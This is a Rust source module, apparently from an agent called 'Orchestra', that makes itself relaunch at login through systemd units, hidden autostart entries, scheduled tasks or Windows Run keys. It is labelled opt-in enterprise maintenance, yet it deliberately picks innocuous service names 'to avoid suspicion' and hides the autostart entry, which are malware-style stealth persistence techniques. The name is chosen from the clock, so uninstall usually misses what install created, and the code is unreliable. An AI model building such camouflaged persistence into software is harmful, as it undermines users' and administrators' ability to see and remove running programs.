//! Opt-in persistence for enterprise maintenance.
//!
//! When `persistence_enabled = true` in `agent.toml`, the agent installs a
//! per-user systemd unit (Linux) or a scheduled task (Windows) that re-launches
//! the agent at the next user login. This is an *opt-in* convenience for
//! environments where an administrator wants the agent to survive reboots
//! without manually redeploying the launcher each time.
//!
//! All entry points return a `Result` and never panic. Test runs use the
//! `ORCHESTRA_PERSISTENCE_ROOT` environment variable to redirect filesystem
//! writes into a temporary directory.

#[cfg(any(target_os = "linux", target_os = "windows"))]
use anyhow::Context;
use anyhow::Result;
use rand::seq::SliceRandom;
use std::path::PathBuf;

#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

/// Choose a generic, unremarkable name for the service/task.
fn get_service_name() -> &'static str {
    // A small, static selection to avoid suspicion.
    let potential_names = ["UserSessionHelper", "ConfigSync", "DisplayCache"];
    // This is not cryptographically secure, but it doesn't need to be.
    // We just want a different name on different machines.
    let index = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
        % potential_names.len() as u64) as usize;
    potential_names[index]
}

/// Determine where the persistence-related files should live. In production
/// this is `$XDG_CONFIG_HOME` or `%APPDATA%`. In tests, the root can be
/// overridden via `ORCHESTRA_PERSISTENCE_ROOT`.
#[cfg(any(target_os = "linux", target_os = "windows"))]
fn config_root() -> PathBuf {
    if let Ok(p) = std::env::var("ORCHESTRA_PERSISTENCE_ROOT") {
        return PathBuf::from(p);
    }
    if let Some(dir) = directories::BaseDirs::new() {
        dir.config_dir().to_path_buf()
    } else {
        PathBuf::from(".")
    }
}

#[cfg(target_os = "linux")]
fn unit_path() -> PathBuf {
    config_root().join("systemd/user").join(format!("{}.service", get_service_name()))
}

#[cfg(target_os = "linux")]
fn autostart_path() -> PathBuf {
    config_root().join("autostart").join(format!("{}.desktop", get_service_name()))
}

#[cfg(target_os = "windows")]
fn task_marker_path() -> PathBuf {
    config_root().join(get_service_name()).join("persistence.marker")
}

/// Install the persistence entry. Returns the absolute path that was created
/// (useful for tests).
pub fn install_persistence() -> Result<PathBuf> {
    install_persistence_inner()
}

/// Remove the persistence entry installed by [`install_persistence`].
pub fn uninstall_persistence() -> Result<()> {
    uninstall_persistence_inner()
}

#[cfg(target_os = "linux")]
fn install_persistence_inner() -> Result<PathBuf> {
    // Try systemd first.
    if let Ok(path) = install_systemd_unit() {
        return Ok(path);
    }
    // Fallback to .desktop autostart.
    install_desktop_autostart()
}

#[cfg(target_os = "linux")]
fn install_systemd_unit() -> Result<PathBuf> {
    let path = unit_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("Failed to create unit directory {}", parent.display()))?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();

    let service_name = get_service_name();
    let unit = format!(
        "[Unit]\n\
         Description={service_name}\n\
         After=network-online.target\n\n\
         [Service]\n\
         Type=simple\n\
         ExecStart={exe_path}\n\
         Restart=on-failure\n\n\
         [Install]\n\
         WantedBy=default.target\n"
    );

    std::fs::write(&path, unit)
        .with_context(|| format!("Failed to write unit file {}", path.display()))?;

    // Best-effort enable; silently tolerate missing systemctl in tests.
    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let status = std::process::Command::new("systemctl")
            .args(["--user", "enable", &format!("{service_name}.service")])
            .status()?;
        if !status.success() {
            anyhow::bail!("systemctl enable failed with status: {status}");
        }
    }
    Ok(path)
}

#[cfg(target_os = "linux")]
fn install_desktop_autostart() -> Result<PathBuf> {
    let path = autostart_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).context("Failed to create autostart directory")?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();
    
    let service_name = get_service_name();
    let desktop_entry = format!(
        "[Desktop Entry]\n\
         Type=Application\n\
         Name={service_name}\n\
         Exec={exe_path}\n\
         Terminal=false\n\
         NoDisplay=true\n"
    );

    std::fs::write(&path, desktop_entry)
        .with_context(|| format!("Failed to write autostart file {}", path.display()))?;

    Ok(path)
}

#[cfg(target_os = "linux")]
fn uninstall_persistence_inner() -> Result<()> {
    // Try to remove both methods.
    let systemd_path = unit_path();
    if systemd_path.exists() {
        if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "disable", &format!("{}.service", get_service_name())])
                .status();
        }
        std::fs::remove_file(&systemd_path)
            .with_context(|| format!("Failed to remove {}", systemd_path.display()))?;
    }

    let autostart_path = autostart_path();
    if autostart_path.exists() {
        std::fs::remove_file(&autostart_path)
            .with_context(|| format!("Failed to remove {}", autostart_path.display()))?;
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn install_persistence_inner() -> Result<PathBuf> {
    // Try schtasks first.
    if let Ok(path) = install_scheduled_task() {
        return Ok(path);
    }
    // Fallback to Run key.
    install_run_key()
}

#[cfg(target_os = "windows")]
fn install_scheduled_task() -> Result<PathBuf> {
    let marker = task_marker_path();
    if let Some(parent) = marker.parent() {
        std::fs::create_dir_all(parent)?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();

    let task_name = get_service_name();

    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let status = std::process::Command::new("schtasks")
            .args([
                "/Create",
                "/F",
                "/SC",
                "ONLOGON",
                "/TN",
                task_name,
                "/TR",
                &exe_path,
            ])
            .status()
            .context("Failed to invoke schtasks")?;
        if !status.success() {
            anyhow::bail!("schtasks /Create exited with {status}");
        }
    }
    // Store the method and name for uninstallation.
    std::fs::write(&marker, format!("schtasks\n{task_name}"))?;
    Ok(marker)
}

#[cfg(target_os = "windows")]
fn install_run_key() -> Result<PathBuf> {
    let marker = task_marker_path();
     if let Some(parent) = marker.parent() {
        std::fs::create_dir_all(parent)?;
    }

    let exe_path = std::env::current_exe()
        .context("Failed to get current executable path")?
        .display()
        .to_string();
    
    let key_name = get_service_name();

    if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_WRITE,
        )?;
        run_key.set_value(key_name, &exe_path)?;
    }
    
    // Store the method and name for uninstallation.
    std::fs::write(&marker, format!("runkey\n{key_name}"))?;
    Ok(marker)
}

#[cfg(target_os = "windows")]
fn uninstall_persistence_inner() -> Result<()> {
    let marker = task_marker_path();
    if marker.exists() {
        if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
            let content = std::fs::read_to_string(&marker)?;
            let mut lines = content.lines();
            let method = lines.next().unwrap_or("");
            let name = lines.next().unwrap_or("");

            if name.is_empty() {
                return Ok(());
            }

            match method {
                "schtasks" => {
                    let _ = std::process::Command::new("schtasks")
                        .args(["/Delete", "/F", "/TN", name])
                        .status();
                }
                "runkey" => {
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    let run_key = hkcu.open_subkey_with_flags(
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        KEY_WRITE,
                    )?;
                    let _ = run_key.delete_value(name);
                }
                _ => {}
            }
        }
        std::fs::remove_file(&marker)?;
    }
    Ok(())
}

#[cfg(not(any(target_os = "linux", target_os = "windows")))]
fn install_persistence_inner() -> Result<PathBuf> {
    anyhow::bail!("Persistence is not implemented on this platform")
}

#[cfg(not(any(target_os = "linux", target_os = "windows")))]
fn uninstall_persistence_inner() -> Result<()> {
    Ok(())
}

#[cfg(test)]
#[cfg(any(target_os = "linux", target_os = "windows"))]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn install_then_uninstall_in_sandbox() {
        let dir = tempdir().unwrap();
        std::env::set_var("ORCHESTRA_PERSISTENCE_ROOT", dir.path());

        let path = install_persistence().expect("install");
        assert!(path.exists(), "unit/marker file was not created");

        // On Windows, check content of marker file
        #[cfg(target_os = "windows")]
        {
            let content = std::fs::read_to_string(&path).unwrap();
            let mut lines = content.lines();
            let method = lines.next().unwrap();
            let name = lines.next().unwrap();
            assert!(!method.is_empty());
            assert!(!name.is_empty());
        }

        uninstall_persistence().expect("uninstall");
        assert!(!path.exists(), "uninstall did not remove the file");

        std::env::remove_var("ORCHESTRA_PERSISTENCE_ROOT");
    }
}
